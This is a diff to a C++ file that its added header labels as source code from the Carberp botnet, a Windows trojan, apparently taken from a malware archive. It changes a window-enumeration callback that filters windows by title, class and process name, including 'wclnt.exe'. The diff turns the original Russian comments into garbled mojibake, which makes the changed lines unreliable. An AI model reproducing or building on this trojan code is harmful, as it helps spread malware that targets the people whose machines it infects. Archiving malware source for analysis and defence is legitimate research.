@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "StdAfx.h"
 #include "EnumWindowInfo.h"
 //#include "tree.h"
@@ -180,13 +191,13 @@ BOOL CALLBACK CEnumWindowInfo::CheckWindow(HWND hw, LPARAM p)
 	if( dataW!= 0
 //		wcsstr( buffer.title, L"wclnt.exe" ) == 0
 		)
-	{//тут список хедеров окон которые надо допускать
+	{//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		pCls->Add( &buffer );
 	}
 	else
 	if( lstrcmp(  Module, pCls->m_ProccessName ) == 0||
 		lstrcmp(  Module, L"wclnt.exe" ) == 0 )
-	{//все процессы включая один назначенный, и их окна показываем всегда в списке
+	{//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		pCls->Add( &buffer );
 	}
 	else
@@ -197,7 +208,7 @@ BOOL CALLBACK CEnumWindowInfo::CheckWindow(HWND hw, LPARAM p)
 	else
 	if(	lstrcmp( buffer.classname, L"#43" ) == 0 )
 	{
-		//эти окна не показываем
+		//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	}
 	else
 	if( lstrcmp( buffer.classname, pCls->m_ClassName ) == 0 ||
